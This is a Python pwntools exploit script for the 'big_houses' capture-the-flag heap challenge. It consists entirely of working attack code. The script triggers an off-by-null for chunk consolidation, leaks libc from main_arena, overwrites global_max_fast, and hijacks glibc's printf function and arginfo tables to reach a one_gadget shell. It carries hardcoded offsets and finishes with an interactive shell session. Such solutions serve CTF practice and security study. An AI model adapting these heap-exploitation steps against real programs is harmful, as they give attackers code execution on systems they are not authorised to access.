from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './big_houses'
HOST = 'big-houses.3k.ctf.to'
PORT = 7412 

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def add(size, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('size:\n', str(size))
    r.sendafter('name:\n', name)

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('spot:\n', str(idx))

def view():
    r.sendlineafter('> ', '3')

def edit(idx, name):
    r.sendlineafter('> ', '4')
    r.sendlineafter('spot:\n', str(idx))
    r.sendafter('name:\n', name)

MAIN_ARENA       = 0x3ebc40;
GLOBAL_MAX_FAST  = 0x3ed940;
PRINTF_FUNCTABLE = 0x3f0658;
PRINTF_ARGINFO   = 0x3ec870;
# ONE_GADGET       = 0x10a38c;
ONE_GADGET       = 0x10a45c;

r = start()
r.sendlineafter('> ', '1')

for i in range(7):
    add(0xf7, 'A')
    delete(0)

add(0xf7, '0000') # freed chunk
add(0xf7, '1111') # block cons
add(0x507, '2222') # trigger off-by-null
add(0xf7, '3333') # victim
add(2*(PRINTF_ARGINFO-MAIN_ARENA)-0x10, 'A') # 6224
add(2*(PRINTF_FUNCTABLE-MAIN_ARENA)-0x10, 'B') # 37920

delete(0)
delete(2)
add(0x508, flat(0, 0)*0x50 + p64(0x710))

delete(3)
add(0xf7, '5555')
view()
r.recvuntil('1: ')
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
dbg('leak')
base = leak - 0x3ebca0
dbg('base')

global_max_fast = base + 0x3ed940
edit(1, flat(0, global_max_fast-0x10))
# pause()

add(0x707, '6666')
edit(4, p64(base+ONE_GADGET) * 0x80)
delete(4)
delete(5)
if args.D:
    debug(r, [0x104a])


r.sendlineafter('> ', '5')
r.sendlineafter('> ', '2')

r.interactive()
r.close()
